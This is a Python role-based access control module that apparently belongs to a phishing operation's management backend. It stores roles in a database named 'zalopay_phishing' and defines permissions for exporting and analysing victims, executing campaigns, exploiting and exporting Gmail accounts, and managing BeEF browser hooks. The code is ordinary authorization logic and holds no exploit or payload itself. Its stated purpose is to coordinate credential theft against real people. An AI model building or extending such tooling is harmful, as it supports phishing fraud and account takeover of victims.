"""
Role-Based Access Control (RBAC)
Permission management and authorization system
"""

import os
from typing import Dict, List, Set, Optional, Any
import logging
import json
from enum import Enum
from dataclasses import dataclass, field
from datetime import datetime, timezone

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class Permission(Enum):
    """System permissions enumeration"""

    # Admin permissions
    ADMIN_READ = "admin:read"
    ADMIN_WRITE = "admin:write"
    ADMIN_DELETE = "admin:delete"
    ADMIN_MANAGE_USERS = "admin:manage_users"
    ADMIN_MANAGE_ROLES = "admin:manage_roles"
    ADMIN_VIEW_LOGS = "admin:view_logs"
    ADMIN_SYSTEM_CONFIG = "admin:system_config"

    # Victim management
    VICTIM_READ = "victim:read"
    VICTIM_WRITE = "victim:write"
    VICTIM_DELETE = "victim:delete"
    VICTIM_EXPORT = "victim:export"
    VICTIM_ANALYZE = "victim:analyze"

    # Campaign management
    CAMPAIGN_READ = "campaign:read"
    CAMPAIGN_WRITE = "campaign:write"
    CAMPAIGN_DELETE = "campaign:delete"
    CAMPAIGN_EXECUTE = "campaign:execute"
    CAMPAIGN_MONITOR = "campaign:monitor"

    # Gmail exploitation
    GMAIL_READ = "gmail:read"
    GMAIL_WRITE = "gmail:write"
    GMAIL_DELETE = "gmail:delete"
    GMAIL_EXPLOIT = "gmail:exploit"
    GMAIL_EXPORT = "gmail:export"

    # BeEF integration
    BEEF_READ = "beef:read"
    BEEF_WRITE = "beef:write"
    BEEF_EXECUTE = "beef:execute"
    BEEF_MANAGE_HOOKS = "beef:manage_hooks"

    # Analytics and reporting
    ANALYTICS_READ = "analytics:read"
    ANALYTICS_EXPORT = "analytics:export"
    REPORTS_GENERATE = "reports:generate"

    # System monitoring
    MONITORING_READ = "monitoring:read"
    MONITORING_WRITE = "monitoring:write"
    MONITORING_ALERTS = "monitoring:alerts"

class Role(Enum):
    """System roles enumeration"""

    SUPER_ADMIN = "super_admin"
    ADMIN = "admin"
    OPERATOR = "operator"
    ANALYST = "analyst"
    VIEWER = "viewer"

@dataclass
class RoleDefinition:
    """Role definition with permissions"""
    name: str
    description: str
    permissions: Set[Permission] = field(default_factory=set)
    is_system_role: bool = True
    created_at: datetime = field(default_factory=lambda: datetime.now(timezone.utc))

class PermissionManager:
    """Permission management system"""

    def __init__(self):
        self.roles: Dict[str, RoleDefinition] = {}
        self._initialize_default_roles()

    def _initialize_default_roles(self):
        """Initialize default system roles"""
        try:
            # Super Admin - Full access to everything
            super_admin_permissions = set(Permission)
            self.roles[Role.SUPER_ADMIN.value] = RoleDefinition(
                name=Role.SUPER_ADMIN.value,
                description="Full system access with all permissions",
                permissions=super_admin_permissions
            )

            # Admin - Administrative access
            admin_permissions = {
                Permission.ADMIN_READ, Permission.ADMIN_WRITE, Permission.ADMIN_DELETE,
                Permission.ADMIN_MANAGE_USERS, Permission.ADMIN_VIEW_LOGS,
                Permission.VICTIM_READ, Permission.VICTIM_WRITE, Permission.VICTIM_DELETE,
                Permission.VICTIM_EXPORT, Permission.VICTIM_ANALYZE,
                Permission.CAMPAIGN_READ, Permission.CAMPAIGN_WRITE, Permission.CAMPAIGN_DELETE,
                Permission.CAMPAIGN_EXECUTE, Permission.CAMPAIGN_MONITOR,
                Permission.GMAIL_READ, Permission.GMAIL_WRITE, Permission.GMAIL_DELETE,
                Permission.GMAIL_EXPLOIT, Permission.GMAIL_EXPORT,
                Permission.BEEF_READ, Permission.BEEF_WRITE, Permission.BEEF_EXECUTE,
                Permission.BEEF_MANAGE_HOOKS,
                Permission.ANALYTICS_READ, Permission.ANALYTICS_EXPORT,
                Permission.REPORTS_GENERATE,
                Permission.MONITORING_READ, Permission.MONITORING_WRITE, Permission.MONITORING_ALERTS
            }
            self.roles[Role.ADMIN.value] = RoleDefinition(
                name=Role.ADMIN.value,
                description="Administrative access to all system functions",
                permissions=admin_permissions
            )

            # Operator - Campaign and victim management
            operator_permissions = {
                Permission.VICTIM_READ, Permission.VICTIM_WRITE, Permission.VICTIM_ANALYZE,
                Permission.CAMPAIGN_READ, Permission.CAMPAIGN_WRITE, Permission.CAMPAIGN_EXECUTE,
                Permission.CAMPAIGN_MONITOR,
                Permission.GMAIL_READ, Permission.GMAIL_EXPLOIT,
                Permission.BEEF_READ, Permission.BEEF_EXECUTE,
                Permission.ANALYTICS_READ,
                Permission.MONITORING_READ
            }
            self.roles[Role.OPERATOR.value] = RoleDefinition(
                name=Role.OPERATOR.value,
                description="Operational access for campaign and victim management",
                permissions=operator_permissions
            )

            # Analyst - Read-only access with analytics
            analyst_permissions = {
                Permission.VICTIM_READ, Permission.VICTIM_ANALYZE,
                Permission.CAMPAIGN_READ, Permission.CAMPAIGN_MONITOR,
                Permission.GMAIL_READ,
                Permission.BEEF_READ,
                Permission.ANALYTICS_READ, Permission.ANALYTICS_EXPORT,
                Permission.REPORTS_GENERATE,
                Permission.MONITORING_READ
            }
            self.roles[Role.ANALYST.value] = RoleDefinition(
                name=Role.ANALYST.value,
                description="Read-only access with analytics capabilities",
                permissions=analyst_permissions
            )

            # Viewer - Basic read-only access
            viewer_permissions = {
                Permission.VICTIM_READ,
                Permission.CAMPAIGN_READ,
                Permission.GMAIL_READ,
                Permission.BEEF_READ,
                Permission.ANALYTICS_READ,
                Permission.MONITORING_READ
            }
            self.roles[Role.VIEWER.value] = RoleDefinition(
                name=Role.VIEWER.value,
                description="Basic read-only access to system data",
                permissions=viewer_permissions
            )

            logger.info("Default roles initialized successfully")

        except Exception as e:
            logger.error(f"Error initializing default roles: {e}")
            raise

    def has_permission(self, user_permissions: List[str], required_permission: Permission) -> bool:
        """
        Check if user has required permission

        Args:
            user_permissions: List of user permissions
            required_permission: Required permission

        Returns:
            True if user has permission
        """
        return required_permission.value in user_permissions

    def has_any_permission(self, user_permissions: List[str], required_permissions: List[Permission]) -> bool:
        """
        Check if user has any of the required permissions

        Args:
            user_permissions: List of user permissions
            required_permissions: List of required permissions

        Returns:
            True if user has at least one permission
        """
        return any(perm.value in user_permissions for perm in required_permissions)

    def has_all_permissions(self, user_permissions: List[str], required_permissions: List[Permission]) -> bool:
        """
        Check if user has all required permissions

        Args:
            user_permissions: List of user permissions
            required_permissions: List of required permissions

        Returns:
            True if user has all permissions
        """
        return all(perm.value in user_permissions for perm in required_permissions)

    def get_role_permissions(self, role_name: str) -> Set[Permission]:
        """
        Get permissions for a specific role

        Args:
            role_name: Name of the role

        Returns:
            Set of permissions for the role
        """
        role = self.roles.get(role_name)
        return role.permissions if role else set()

    def get_user_permissions(self, user_roles: List[str], user_permissions: List[str] = None) -> Set[str]:
        """
        Get all permissions for a user based on roles and direct permissions

        Args:
            user_roles: List of user roles
            user_permissions: Direct user permissions (optional)

        Returns:
            Set of all user permissions
        """
        all_permissions = set()

        # Add permissions from roles
        for role_name in user_roles:
            role_permissions = self.get_role_permissions(role_name)
            all_permissions.update(perm.value for perm in role_permissions)

        # Add direct permissions
        if user_permissions:
            all_permissions.update(user_permissions)

        return all_permissions

    def create_custom_role(self, name: str, description: str, permissions: List[str],
                          mongodb_connection=None) -> Dict[str, Any]:
        """
        Create custom role

        Args:
            name: Role name
            description: Role description
            permissions: List of permission strings
            mongodb_connection: MongoDB connection for persistence

        Returns:
            Creation result
        """
        try:
            # Validate permissions
            valid_permissions = set()
            for perm_str in permissions:
                try:
                    permission = Permission(perm_str)
                    valid_permissions.add(permission)
                except ValueError:
                    logger.warning(f"Invalid permission: {perm_str}")
                    continue

            # Create role definition
            role = RoleDefinition(
                name=name,
                description=description,
                permissions=valid_permissions,
                is_system_role=False
            )

            # Store in memory
            self.roles[name] = role

            # Store in database if connection available
            if mongodb_connection:
                self._save_role_to_db(role, mongodb_connection)

            logger.info(f"Custom role created: {name}")
            return {
                "success": True,
                "role": {
                    "name": role.name,
                    "description": role.description,
                    "permissions": [perm.value for perm in role.permissions],
                    "is_system_role": role.is_system_role,
                    "created_at": role.created_at.isoformat()
                }
            }

        except Exception as e:
            logger.error(f"Error creating custom role: {e}")
            return {"success": False, "error": "Failed to create role"}

    def _save_role_to_db(self, role: RoleDefinition, mongodb_connection):
        """Save role to database"""
        try:
            db = mongodb_connection.get_database("zalopay_phishing")
            roles_collection = db.roles

            role_doc = {
                "name": role.name,
                "description": role.description,
                "permissions": [perm.value for perm in role.permissions],
                "is_system_role": role.is_system_role,
                "created_at": role.created_at,
                "updated_at": datetime.now(timezone.utc)
            }

            roles_collection.replace_one(
                {"name": role.name},
                role_doc,
                upsert=True
            )

        except Exception as e:
            logger.error(f"Error saving role to database: {e}")

    def load_roles_from_db(self, mongodb_connection):
        """Load custom roles from database"""
        try:
            if not mongodb_connection:
                return

            db = mongodb_connection.get_database("zalopay_phishing")
            roles_collection = db.roles

            # Load custom roles (skip system roles)
            custom_roles = roles_collection.find({"is_system_role": False})

            for role_doc in custom_roles:
                try:
                    permissions = set()
                    for perm_str in role_doc.get("permissions", []):
                        try:
                            permission = Permission(perm_str)
                            permissions.add(permission)
                        except ValueError:
                            continue

                    role = RoleDefinition(
                        name=role_doc["name"],
                        description=role_doc["description"],
                        permissions=permissions,
                        is_system_role=False,
                        created_at=role_doc.get("created_at", datetime.now(timezone.utc))
                    )

                    self.roles[role.name] = role

                except Exception as e:
                    logger.error(f"Error loading role {role_doc.get('name')}: {e}")

            logger.info(f"Loaded {len(self.roles)} roles from database")

        except Exception as e:
            logger.error(f"Error loading roles from database: {e}")

    def get_all_roles(self) -> Dict[str, Dict[str, Any]]:
        """Get all roles with their permissions"""
        return {
            name: {
                "name": role.name,
                "description": role.description,
                "permissions": [perm.value for perm in role.permissions],
                "is_system_role": role.is_system_role,
                "created_at": role.created_at.isoformat()
            }
            for name, role in self.roles.items()
        }

class AuthorizationMiddleware:
    """Authorization middleware for API endpoints"""

    def __init__(self, permission_manager: PermissionManager = None):
        self.permission_manager = permission_manager or PermissionManager()

    def require_permission(self, required_permission: Permission):
        """
        Decorator to require specific permission

        Args:
            required_permission: Required permission

        Returns:
            Decorator function
        """
        def decorator(func):
            def wrapper(*args, **kwargs):
                # Get user from request context (implementation depends on framework)
                user = self._get_current_user()

                if not user:
                    return {
                        "error": "Authentication required",
                        "status_code": 401
                    }

                # Check permission
                user_permissions = self.permission_manager.get_user_permissions(
                    user.get("roles", []),
                    user.get("permissions", [])
                )

                if not self.permission_manager.has_permission(
                    list(user_permissions),
                    required_permission
                ):
                    return {
                        "error": "Insufficient permissions",
                        "status_code": 403,
                        "required_permission": required_permission.value
                    }

                # Execute original function
                return func(*args, **kwargs)

            return wrapper
        return decorator

    def require_any_permission(self, required_permissions: List[Permission]):
        """
        Decorator to require any of the specified permissions

        Args:
            required_permissions: List of required permissions

        Returns:
            Decorator function
        """
        def decorator(func):
            def wrapper(*args, **kwargs):
                user = self._get_current_user()

                if not user:
                    return {
                        "error": "Authentication required",
                        "status_code": 401
                    }

                user_permissions = self.permission_manager.get_user_permissions(
                    user.get("roles", []),
                    user.get("permissions", [])
                )

                if not self.permission_manager.has_any_permission(
                    list(user_permissions),
                    required_permissions
                ):
                    return {
                        "error": "Insufficient permissions",
                        "status_code": 403,
                        "required_permissions": [perm.value for perm in required_permissions]
                    }

                return func(*args, **kwargs)

            return wrapper
        return decorator

    def require_all_permissions(self, required_permissions: List[Permission]):
        """
        Decorator to require all specified permissions

        Args:
            required_permissions: List of required permissions

        Returns:
            Decorator function
        """
        def decorator(func):
            def wrapper(*args, **kwargs):
                user = self._get_current_user()

                if not user:
                    return {
                        "error": "Authentication required",
                        "status_code": 401
                    }

                user_permissions = self.permission_manager.get_user_permissions(
                    user.get("roles", []),
                    user.get("permissions", [])
                )

                if not self.permission_manager.has_all_permissions(
                    list(user_permissions),
                    required_permissions
                ):
                    return {
                        "error": "Insufficient permissions",
                        "status_code": 403,
                        "required_permissions": [perm.value for perm in required_permissions]
                    }

                return func(*args, **kwargs)

            return wrapper
        return decorator

    def require_role(self, allowed_roles: List[str]):
        """
        Decorator to require specific role(s)

        Args:
            allowed_roles: List of allowed role names

        Returns:
            Decorator function
        """
        def decorator(func):
            def wrapper(*args, **kwargs):
                user = self._get_current_user()

                if not user:
                    return {
                        "error": "Authentication required",
                        "status_code": 401
                    }

                user_roles = user.get("roles", [])

                if not any(role in allowed_roles for role in user_roles):
                    return {
                        "error": "Insufficient role permissions",
                        "status_code": 403,
                        "user_roles": user_roles,
                        "allowed_roles": allowed_roles
                    }

                return func(*args, **kwargs)

            return wrapper
        return decorator

    def _get_current_user(self) -> Optional[Dict[str, Any]]:
        """
        Get current user from request context
        This should be implemented based on the web framework being used
        """
        # Placeholder implementation - should be replaced with actual user extraction
        # from JWT token or session
        return None

class PermissionChecker:
    """Utility class for permission checking"""

    def __init__(self, permission_manager: PermissionManager = None):
        self.permission_manager = permission_manager or PermissionManager()

    def check_permission(self, user: Dict[str, Any], permission: Permission) -> bool:
        """Check if user has specific permission"""
        user_permissions = self.permission_manager.get_user_permissions(
            user.get("roles", []),
            user.get("permissions", [])
        )
        return self.permission_manager.has_permission(list(user_permissions), permission)

    def check_any_permission(self, user: Dict[str, Any], permissions: List[Permission]) -> bool:
        """Check if user has any of the specified permissions"""
        user_permissions = self.permission_manager.get_user_permissions(
            user.get("roles", []),
            user.get("permissions", [])
        )
        return self.permission_manager.has_any_permission(list(user_permissions), permissions)

    def check_all_permissions(self, user: Dict[str, Any], permissions: List[Permission]) -> bool:
        """Check if user has all specified permissions"""
        user_permissions = self.permission_manager.get_user_permissions(
            user.get("roles", []),
            user.get("permissions", [])
        )
        return self.permission_manager.has_all_permissions(list(user_permissions), permissions)

    def check_role(self, user: Dict[str, Any], role: str) -> bool:
        """Check if user has specific role"""
        return role in user.get("roles", [])

    def get_user_effective_permissions(self, user: Dict[str, Any]) -> Set[str]:
        """Get all effective permissions for user"""
        return self.permission_manager.get_user_permissions(
            user.get("roles", []),
            user.get("permissions", [])
        )

# Global instances
permission_manager = PermissionManager()
auth_middleware = AuthorizationMiddleware(permission_manager)
permission_checker = PermissionChecker(permission_manager)

def initialize_permissions(mongodb_connection=None):
    """Initialize permission system"""
    if mongodb_connection:
        permission_manager.load_roles_from_db(mongodb_connection)

def require_permission(permission: Permission):
    """Convenience function for requiring permission"""
    return auth_middleware.require_permission(permission)

def require_any_permission(permissions: List[Permission]):
    """Convenience function for requiring any permission"""
    return auth_middleware.require_any_permission(permissions)

def require_all_permissions(permissions: List[Permission]):
    """Convenience function for requiring all permissions"""
    return auth_middleware.require_all_permissions(permissions)

def require_role(roles: List[str]):
    """Convenience function for requiring role"""
    return auth_middleware.require_role(roles)

def check_user_permission(user: Dict[str, Any], permission: Permission) -> bool:
    """Check user permission (convenience function)"""
    return permission_checker.check_permission(user, permission)

def get_user_permissions(user: Dict[str, Any]) -> Set[str]:
    """Get user permissions (convenience function)"""
    return permission_checker.get_user_effective_permissions(user)